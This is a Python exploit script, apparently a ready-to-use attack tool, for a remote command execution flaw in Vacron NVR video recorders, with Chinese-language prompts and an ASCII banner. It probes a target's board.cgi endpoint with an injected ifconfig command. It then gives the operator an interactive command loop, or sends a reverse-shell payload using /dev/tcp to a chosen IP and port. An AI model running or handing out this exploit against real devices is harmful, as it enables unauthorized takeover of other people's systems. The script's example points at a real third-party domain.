import argparse
import textwrap
import warnings
import requests
import urllib3
# Vacron NVR-远程命令执行



def main():
    urllib3.disable_warnings()
    warnings.filterwarnings("ignore")
    parser = argparse.ArgumentParser(description="一个代码执行工具",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''示例：python 1111.py -u www.baidu.com '''))
    parser.add_argument("-u", "--url", dest="url", help="请输入要检测的url地址")
    args = parser.parse_args()
    if "http" not in args.url:
        args.url = f"http://{args.url}"
    check(args.url)

def check(url):
    u = f"{url}/board.cgi?cmd=ifconfig"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.2346.18 Safari/537.36'
    }
    try:
        a = requests.get(url=u, headers=headers, verify=False, timeout=5)
        a.encoding = 'utf-8'
        html = a.text
        b = a.status_code
        if b == 200 and "HWaddr" in html:
            print('[+]存在漏洞', url)
            rce(url)
        else:
            print('[-]不存在漏洞', url)
    except Exception as i:
        print('[x]请求发生错误', url)


def rce(url):
    moshi=input("反弹shell/getshell(U/I):")
    if moshi.upper()=='I':
        while 1:
            cmd=input(">>")
            u = f"{url}/board.cgi?cmd={cmd}"
            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.2346.18 Safari/537.36'
            }
            a = requests.get(url=u, headers=headers, verify=False,timeout=5)
            a.encoding = 'utf-8'
            html = a.text
            b = a.status_code
            if b == 200:
                print(html)
    elif moshi.upper()=='U':
        ip=input("IP:")
        port=input("PORT:")
        u = f"{url}/board.cgi?cmd=sh -i >& /dev/tcp/{ip}/{port} 0>&1"
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.2346.18 Safari/537.36'
        }
        a = requests.get(url=u, headers=headers, verify=False, timeout=5)
        print(a.text)




if __name__ == '__main__':
    banner = '''
    $$\                                                                   
$$ |                                                                  
$$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\  $$$$$$$\   $$$$$$\  
$$  __$$\  \____$$\ $$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ 
$$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  $$ |$$ /  $$ |$$ |  $$ |$$ /  $$ |
$$ |  $$ |$$  __$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
$$ |  $$ |\$$$$$$$ |\$$$$$$  |\$$$$$$$ |\$$$$$$  |$$ |  $$ |\$$$$$$$ |
\__|  \__| \_______| \______/  \____$$ | \______/ \__|  \__| \____$$ |
                              $$\   $$ |                    $$\   $$ |
                              \$$$$$$  |                    \$$$$$$  |
                               \______/                      \______/ 

    '''
    print(banner)
    main()

